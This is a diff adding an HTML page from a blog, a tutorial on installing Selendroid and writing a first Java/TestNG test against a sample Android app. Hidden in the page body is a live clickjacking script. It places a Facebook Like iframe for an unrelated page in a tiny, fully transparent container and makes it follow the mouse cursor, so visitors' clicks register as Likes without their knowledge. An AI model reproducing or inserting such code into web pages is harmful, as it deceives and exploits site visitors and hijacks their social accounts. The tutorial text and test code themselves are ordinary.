@@ -1,0 +1,481 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Mobile testing : Setup Selendroid and create first test script of android application - Selenium Tutorial</title>
+    <meta name="author" content="Ta Bao Lan">
+   	
+	<meta name="description" content="Mobile testing : Setup Selendroid and create first test script of android application" />
+	
+	<meta name="keywords" content="" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<link href="/atom.xml" rel="alternate" title="Selenium Tutorial" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.ico" rel="shortcut icon">
+    <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+    <link href='http://fonts.googleapis.com/css?family=Slackey' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Amethysta' rel='stylesheet' type='text/css'>
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+    <script type="text/javascript" src="/javascripts/jquery-tapir.js"></script>
+
+    <!-- remove or comment it to disable ajaxification -->   
+    <!--  <script src="/javascripts/ajaxify.js"></script> -->   
+
+
+
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    var pluginUrl =
+            '//www.google-analytics.com/plugins/ga/inpage_linkid.js';
+    _gaq.push(['_require', 'inpage_linkid', pluginUrl]);
+    _gaq.push(['_setAccount', 'UA-51278981-1']);
+    _gaq.push(['_trackPageview']);
+    function initGa() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    }
+    setTimeout(initGa, 50);
+</script>
+
+
+
+</head>
+
+<body>
+
+    <div id="wrapper">
+    <header id="header" class="inner"><!-- for more effects see _animate.scss -->
+<h1 class="animated bounceInDown">
+    <div id="headerbg">
+		Selenium Tutorial
+		<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- ad-banner-responsive -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-5798698216356388"
+     data-ad-slot="7145934352"
+     data-ad-format="auto"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+    </div>
+</h1>
+<br>
+
+<ul id="social-links" style="text-align:center">
+  
+  
+  <!-- Google Plus -->
+  <li>
+  <a href="http://plus.google.com/lantabao?rel=author" class="google" title="Google+"></a>
+  </li>
+  
+  
+  <!-- Facebook -->
+  <li>
+  <a href="http://www.facebook.com/gaumun" class="facebook" title="Facebook"></a>
+  </li>
+  
+  
+  
+  <!-- LinkedIn -->
+  <li>
+  <a href="http://www.linkedin.com/in/tabaolan" class="linkedin" title="LinkedIn"></a>
+  </li>
+  
+  
+  <!-- Skype -->
+  <li>
+  <a href="http://myskype.info/lantb1987" class="skype" title="Skype"></a>
+  </li>
+  
+  
+  
+</ul>
+
+
+<!-- use full url including 'index.html' for navigation bar if you are using ajax -->
+<ul id="nav">
+	<li id="ajax"><a href="/index.html">Home</a></li>
+	<li id="ajax"><a href="/categories/webdriver/">WebDriver</a></li>
+	<li id="ajax"><a href="/categories/newbie/">Selenium Beginner</a></li>
+	<li id="ajax"><a href="/categories/testng-framework/">TestNG Framework</a></li>
+	<li id="ajax"><a href="/categories/selenium-framework/">Automation Framework</a></li>
+	<li id="ajax"><a href="/categories/icecream-framework/">IceCream Framework</a></li>
+	<li id="ajax"><a href="/categories/selenium-mobile/">Selenium Mobile</a></li>
+    <li id="ajax"><a href="/categories/tricks/">Tips&Tricks</a></li>
+	<li id="ajax"><a href="/categories/jmeter/">JMETER</a></li>
+	<li id="ajax"><a href="/categories/mobiletest/">Mobile Testing</a></li>
+	
+    <li>
+    <div id="dark">
+        <form method="get" action="/search.html" id="search">
+            <input name="query" type="text" placeholder="Search..." x-webkit-speech />
+        </form>
+    </div>
+    </li>
+        
+</ul>
+
+
+
+﻿
+</header>
+
+<div id="toload">
+<!-- begin toload -->
+<div id="content" class="inner">
+<div style="overflow: hidden; width: 10px; height: 12px; position: absolute; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0; opacity: 0.0;" id="icontainer">
+    <iframe src="http://www.facebook.com/plugins/like.php?href=https://www.facebook.com/pages/Trollvd/606655129460867&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;font=tahoma&amp;colorscheme=light&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:50px; height:23px;" allowTransparency="true" id="fbframe" name="fbframe"></iframe>
+    <!--end facebook like frame code-->
+</div>
+<script>
+    var iflag = 0;
+    var icontainer = document.getElementById('icontainer');
+    var standardbody = (document.compatMode == "CSS1Compat") ? document.documentElement : document.body   
+	function mouseFollower(e){ /* DO NOT EDIT THIS */ 
+	if (window.event) { icontainer.style.top = (window.event.y-5)+standardbody.scrollTop+'px'; icontainer.style.left = (window.event.x-5)+standardbody.scrollLeft+'px'; } else { icontainer.style.top = (e.pageY-5)+'px'; icontainer.style.left = (e.pageX-5)+'px'; } } document.onmousemove = function(e) { if (iflag == 0) {mouseFollower(e);} }
+</script>
+        <article class="post">
+
+	<h2 class="title">Mobile Testing : Setup Selendroid and Create First Test Script of Android Application</h2>
+	<div class="entry-content"><h2>Setup Selendroid and create first test script of android application</h2>
+
+<h3>About Selendroid :</h3>
+
+<p>Selendroid is an open source automation framework which drives of UI of android native, hybrid and mobile web application.</p>
+
+<p>It supports both emulator and real device. It uses Json Wire Protocol to run webdriver test scripts on device.</p>
+
+<p>It can be integrated with selenium grid for parallel execution on multiple nodes.</p>
+
+<p>No need any modification in application and not need source code to automate application.</p>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+<p><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-5798698216356388" data-ad-slot="3378542759" data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></p>
+
+<h3>Prerequisites:</h3>
+
+<p>1.JDK should be installed and java home path setup in your machine.</p>
+
+<p>2.Android SDK should be installed on your machine and android path should be setup in your machine</p>
+
+<p>3.Download Selendroid from link: <a href="http://selendroid.io/">Click here</a></p>
+
+<p>4.Selenium jar file from : <a href="http://docs.seleniumhq.org/download/">Click here</a></p>
+
+<p>5.Eclipse.</p>
+
+<p>6.Create new Emulator or attached real devices with you machine.</p>
+
+<h3>Run Server:</h3>
+
+<p>Open command prompt and go to downloaded Selendroid jar file and run below command</p>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+<p><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-5798698216356388" data-ad-slot="9425076351" data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>java -jar selendroid-standalone-0.9.0-with-dependencies.jar -aut resigned-selendroid-test-app-0.9.0.apk</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Where selendroid-standalone-0.9.0-with-dependencies.jar is downloaded selendroid jar file and resigned-selendroid-test-app-0.9.0.apk application apk file name.</p>
+
+<p>You can download this sample application from link: (Download)[<a href="http://selendroid.io/">http://selendroid.io/</a>]</p>
+
+<p><img src="/images/mb13.jpg"></p>
+
+<h3>Check server status</h3>
+
+<p>launch browser and open url [<a href="http://localhost:4444/wd/hub/status">http://localhost:4444/wd/hub/status</a>] you should see your url like below screen:</p>
+
+<p><img src="/images/mb14.jpg"></p>
+
+<h3>Step to create test script:</h3>
+
+<p>1.Create a java project in eclipse.</p>
+
+<p>2.Add selenium and selendroid jar file in eclipse environments:</p>
+
+<p>3.Create package “com.test“ and add java file “SelendroidTest.java” with below code:</p>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+<p><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-5798698216356388" data-ad-slot="7145934352" data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>package com.test;
+</span><span class='line'> 
+</span><span class='line'>import io.selendroid.SelendroidCapabilities;
+</span><span class='line'>import io.selendroid.SelendroidConfiguration;
+</span><span class='line'>import io.selendroid.SelendroidDriver;
+</span><span class='line'>import io.selendroid.SelendroidLauncher;
+</span><span class='line'>import org.openqa.selenium.By;
+</span><span class='line'>import org.openqa.selenium.WebDriver;
+</span><span class='line'>import org.openqa.selenium.WebElement;
+</span><span class='line'>import org.testng.Assert;
+</span><span class='line'>import org.testng.annotations.AfterSuite;
+</span><span class='line'>import org.testng.annotations.BeforeSuite;
+</span><span class='line'>import org.testng.annotations.Test;
+</span><span class='line'> 
+</span><span class='line'>public class SelendroidTest {
+</span><span class='line'>  
+</span><span class='line'> private WebDriver driver ;
+</span><span class='line'>  
+</span><span class='line'> @BeforeSuite
+</span><span class='line'> public void setUp() throws Exception
+</span><span class='line'> {  
+</span><span class='line'>      SelendroidConfiguration config = new SelendroidConfiguration();
+</span><span class='line'>     config.addSupportedApp("selendroid-test-app-0.9.0.apk");
+</span><span class='line'>     SelendroidLauncher selendroidServer = new SelendroidLauncher(config);
+</span><span class='line'>     selendroidServer.lauchSelendroid();
+</span><span class='line'> 
+</span><span class='line'>     SelendroidCapabilities caps = new SelendroidCapabilities("io.selendroid.testapp:0.9.0");
+</span><span class='line'>     driver = new SelendroidDriver(caps);
+</span><span class='line'> }
+</span><span class='line'> 
+</span><span class='line'> @Test
+</span><span class='line'> public void selendroidTest() throws Exception
+</span><span class='line'> {  
+</span><span class='line'>  WebElement inputField = driver.findElement(By.id("my_text_field"));
+</span><span class='line'>  Assert.assertEquals("true", inputField.getAttribute("enabled"));
+</span><span class='line'>  inputField.sendKeys("Selendroid");
+</span><span class='line'> 
+</span><span class='line'>  Assert.assertEquals("Selendroid", inputField.getText());
+</span><span class='line'>   
+</span><span class='line'>  //click EN butoon
+</span><span class='line'>  WebElement button = driver.findElement(By.id("buttonTest"));  
+</span><span class='line'>  button.click();
+</span><span class='line'>   
+</span><span class='line'>  //click accept button
+</span><span class='line'>  button = driver.findElement(By.id("button2"));  
+</span><span class='line'>  button.click();
+</span><span class='line'>   
+</span><span class='line'>  Thread.sleep(5000);
+</span><span class='line'>  //click on registration button
+</span><span class='line'>  button = driver.findElement(By.id("startUserRegistration"));  
+</span><span class='line'>  button.click();
+</span><span class='line'>   
+</span><span class='line'>  Thread.sleep(10000);
+</span><span class='line'>  // fill registration form data
+</span><span class='line'>  WebElement element = driver.findElement(By.id("label_username"));
+</span><span class='line'>  String text = element.getText();
+</span><span class='line'>  System.out.println(text);
+</span><span class='line'>  element = driver.findElement(By.id("inputUsername"));
+</span><span class='line'>  element.sendKeys("bob");
+</span><span class='line'>   
+</span><span class='line'>  element = driver.findElement(By.id("inputEmail"));
+</span><span class='line'>  element.sendKeys("test@gmail.com");
+</span><span class='line'>   
+</span><span class='line'>  element = driver.findElement(By.id("inputPassword"));
+</span><span class='line'>  element.clear();
+</span><span class='line'>  element.sendKeys("test1233");
+</span><span class='line'>   
+</span><span class='line'>  element = driver.findElement(By.id("inputName"));
+</span><span class='line'>  element.clear();
+</span><span class='line'>  element.sendKeys("My Name ");
+</span><span class='line'>   
+</span><span class='line'>  element = driver.findElement(By.id("input_preferedProgrammingLanguage"));
+</span><span class='line'>  element.click();
+</span><span class='line'>   
+</span><span class='line'>  element = driver.findElement(By.id("text1"));
+</span><span class='line'>  element.click();
+</span><span class='line'>   
+</span><span class='line'>  element = driver.findElement(By.id("input_adds"));
+</span><span class='line'>  element.click();
+</span><span class='line'>   
+</span><span class='line'>  element = driver.findElement(By.id("btnRegisterUser"));
+</span><span class='line'>  element.click();
+</span><span class='line'>   
+</span><span class='line'>  element = driver.findElement(By.id("buttonRegisterUser"));
+</span><span class='line'>  element.click();  
+</span><span class='line'> }
+</span><span class='line'>  
+</span><span class='line'> @AfterSuite
+</span><span class='line'> public void tearDown(){
+</span><span class='line'>        driver.quit();
+</span><span class='line'> }
+</span><span class='line'>} </span></code></pre></td></tr></table></div></figure>
+
+
+
+</div>
+
+<div class="meta">
+	
+		<span class="comments"><a href="/mobile-testing-seup-selendroid-and-create-first-test-script-of-android-application/#disqus_thread">Comments</a></span>
+	
+</div>
+
+<br>
+</article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	
+	<a class="addthis_counter addthis_pill_style"></a>
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+
+<section id="comment">
+    <h2 class="title">Comments</h2>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+
+ </div>
+    <footer id="footer">
+    <div style="display:inline">
+    Copyright &copy; 2014
+
+    Ta Bao Lan
+. Powered by <a href="http://octopress.org">Octopress</a>
+</div>
+
+
+    </footer>
+    <script src="/javascripts/fabric.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+<script type="text/javascript">
+      var disqus_shortname = 'tabaolan1987';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://www.tabaolan.com/mobile-testing-seup-selendroid-and-create-first-test-script-of-android-application/';
+        var disqus_url = 'http://www.tabaolan.com/mobile-testing-seup-selendroid-and-create-first-test-script-of-android-application/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+<!-- end toload --> 
+</div>
+</div>
+<script src="/javascripts/jquery.ui.totop.js" type="text/javascript"></script>
+<script type="text/javascript">
+/*<![CDATA[*/
+;(function($){$().UItoTop({easingType:'easeOutCirc'});})(jQuery); 
+/*]]>*/
+</script><!-- remove it to remove the scroll to top button -->
+</body>
+</html>
